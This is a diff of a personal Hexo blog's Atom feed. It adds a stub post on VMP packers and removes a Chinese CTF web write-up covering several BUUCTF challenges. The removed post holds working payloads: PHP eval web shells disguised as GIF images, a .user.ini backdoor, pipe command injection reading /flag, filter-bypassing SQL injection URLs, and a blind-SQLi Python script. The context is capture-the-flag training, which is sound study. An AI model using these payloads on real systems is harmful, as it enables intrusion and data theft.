@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>某jk的奇怪博客</title>
+  <title>by HJK</title>
   
   
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-11-19T15:57:17.057Z</updated>
+  <updated>2021-01-20T18:58:27.618Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>VMP壳原理</title>
+    <link href="http://yoursite.com/2021/01/21/VMP/"/>
+    <id>http://yoursite.com/2021/01/21/VMP/</id>
+    <published>2021-01-20T18:57:23.000Z</published>
+    <updated>2021-01-20T18:58:27.618Z</updated>
+    
+    <content type="html"><![CDATA[<hr><a id="more"></a><p>！！！先立flag， 等有空再写 ！！！</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;hr&gt;
+    
+    </summary>
+    
+    
+      <category term="note" scheme="http://yoursite.com/categories/note/"/>
+    
+    
+      <category term="PE文件壳" scheme="http://yoursite.com/tags/PE%E6%96%87%E4%BB%B6%E5%A3%B3/"/>
+    
+  </entry>
   
   <entry>
     <title>利用SEH链的反调试</title>
@@ -447,29 +470,6 @@
     
     
       <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-      <category term="CTF - Web" scheme="http://yoursite.com/tags/CTF-Web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>week20200727-20200802</title>
-    <link href="http://yoursite.com/2020/07/28/week20200727-20200802/"/>
-    <id>http://yoursite.com/2020/07/28/week20200727-20200802/</id>
-    <published>2020-07-27T17:28:32.000Z</published>
-    <updated>2020-08-05T18:07:11.716Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Week-3-lt-2020-07-27-2020-08-02-gt"><a href="#Week-3-lt-2020-07-27-2020-08-02-gt" class="headerlink" title="Week 3 &lt;2020.07.27 - 2020.08.02&gt;"></a>Week 3 &lt;2020.07.27 - 2020.08.02&gt;</h1><a id="more"></a><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目和网页都给出了提示，考察文件包含</p><p>同 Secret File 的解法，使用”php://filter”伪协议进行包含</p><p>payload：/?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>获得base64码，解密得到flag</p><p>flag{f876c961-c87b-4060-a5b5-299aae870ace}</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>用AntSword连接，密码网页给出了是”Syc”</p><p><img src="/2020/07/28/week20200727-20200802/image-20200729003126637.png" alt="image-20200729003126637"></p><p>连接，在根目录找到flag文件</p><p>flag{41d79b55-d82a-4490-9bb4-31f8308a676a}</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>—— 转自<a href="https://www.cnblogs.com/20175211lyz/p/11455355.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11455355.html</a> ——</p><blockquote><p><strong>.user.ini 文件</strong><br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER[‘DOCUMENT_ROOT’]]所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。<br>两个新的 INI 指令，<em>user_ini.filename</em> 和 <em>user_ini.cache_ttl</em> 控制着用户 INI 文件的使用。<br><em>user_ini.filename</em> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 <em>.user.ini*。<br>*user_ini.cache_ttl</em> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote><blockquote><p><strong>绕过exif_imagetype()方法</strong><br>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_width 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_height 7</span></span><br></pre></td></tr></table></figure><p>知识点：<br>1.利用.user.ini上传/隐藏后门<br>2.绕过exif_imagetype()</p><p>———————————————————————————————</p><p>通过上传<code>.user.ini</code>文件来给同目录下的<code>index.php</code>文件添加上一些额外的内容</p><blockquote><p>GIF89a：图片格式gif必要文件头信息</p></blockquote><p>依次上传：<br><strong>a.jpg</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>.user.ini</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure><p>蚁剑连接<br><a href="http://4d647826-57bc-45db-9d04-4220e9fc4cdd.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php" target="_blank" rel="noopener">http://4d647826-57bc-45db-9d04-4220e9fc4cdd.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</a><br>读取flag</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>没有过滤，管道符直接取flag</p><p>payload: 127.0.0.1 | cat /flag</p><p>flag{de9ab224-511d-4a33-9e1d-5c871c9518b1}</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>知识点：双写绕过</p><p>数据库 payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23</span><br></pre></td></tr></table></figure><p>数据表 payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br></pre></td></tr></table></figure><p>目标在 ‘b4bsql’</p><p>列 payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br></pre></td></tr></table></figure><p>列名’id,username,password’</p><p>字段 payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</span><br></pre></td></tr></table></figure><p>flag{04a7a268-baf9-48a5-b7cb-2b8aeebae765}</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>脚本解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://d97b67d8-5392-40dd-9416-1943726ff03f.node3.buuoj.cn/index.php"</span>;</span><br><span class="line"> </span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">num=<span class="number">0</span>  <span class="comment">#用了来判断是不是flag已经拼完整了</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span>%(i,j);</span><br><span class="line"><span class="comment">#print(str((i-1)*96+j-32)+":~"+payload+"~")</span></span><br><span class="line"> </span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"id"</span>:payload,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line"> </span><br><span class="line">r.encoding = r.apparent_encoding</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">x = chr(j)</span><br><span class="line">result+=str(x)</span><br><span class="line">print(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">"&#125;"</span> <span class="keyword">in</span> result:</span><br><span class="line">print(result)</span><br><span class="line">num=<span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>可以上传phtml文件，那么做一个phtml文件，将内容编为一句话木马上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php被过滤，使用JS脚本绕过：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">'cmd'</span>]);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>猜测文件上传目录是upload，蚁剑连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;upload&#x2F;a.phtml?a&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;Week-3-lt-2020-07-27-2020-08-02-gt&quot;&gt;&lt;a href=&quot;#Week-3-lt-2020-07-27-2020-08-02-gt&quot; class=&quot;headerlink&quot; title=&quot;Week 3 &amp;lt;2020.07.27 - 2020.08.02&amp;gt;&quot;&gt;&lt;/a&gt;Week 3 &amp;lt;2020.07.27 - 2020.08.02&amp;gt;&lt;/h1&gt;
-    
-    </summary>
-    
-    
-      <category term="BUUCTF" scheme="http://yoursite.com/categories/BUUCTF/"/>
     
     
       <category term="CTF - Web" scheme="http://yoursite.com/tags/CTF-Web/"/>
